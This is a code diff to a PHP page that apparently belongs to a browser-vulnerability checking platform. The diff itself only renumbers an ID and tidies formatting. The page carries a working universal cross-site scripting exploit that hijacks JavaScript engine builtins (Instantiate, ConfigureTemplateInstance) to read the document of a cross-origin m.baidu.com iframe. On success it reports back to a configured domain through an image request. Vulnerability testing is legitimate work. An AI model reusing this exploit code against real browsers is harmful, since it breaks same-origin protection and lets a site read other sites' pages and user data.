@@ -1,5 +1,5 @@
 <?php
-    //漏洞编号：114347
+    //漏洞编号：143437
     include "config.php";
     $code = htmlspecialchars(strip_tags($_GET['code']),ENT_QUOTES);
 ?>
@@ -9,7 +9,6 @@
         frame.src = "http://m.baidu.com/";
 
         frame.onload = function() {
-
             Function("}, (builtins = this), function() {");
             var originalInstantiate = builtins.Instantiate;
             builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {});
@@ -17,8 +16,9 @@
             var template = null;
             builtins.Instantiate = function(x, y) {
                 if (flag) {
-                    doc = frame.contentWindow.document;
-                    if(doc.domain == "m.baidu.com"){	//payload运行成功
+                    var doc = frame.contentWindow.document;
+                    //payload运行成功
+                    if(doc.domain == "m.baidu.com"){
                         var code ='<?php echo $code;  ?>';
                         var domain ='<?php echo $DOMAIN;  ?>';
                         new Image().src = domain + "/php/set.php?code=" + code + "&suc=1";
@@ -31,9 +31,6 @@
             document.implementation;
             flag = 1;
             builtins.ConfigureTemplateInstance(frame.contentWindow, template);
-
         }
-
-
     </script>
 </body>
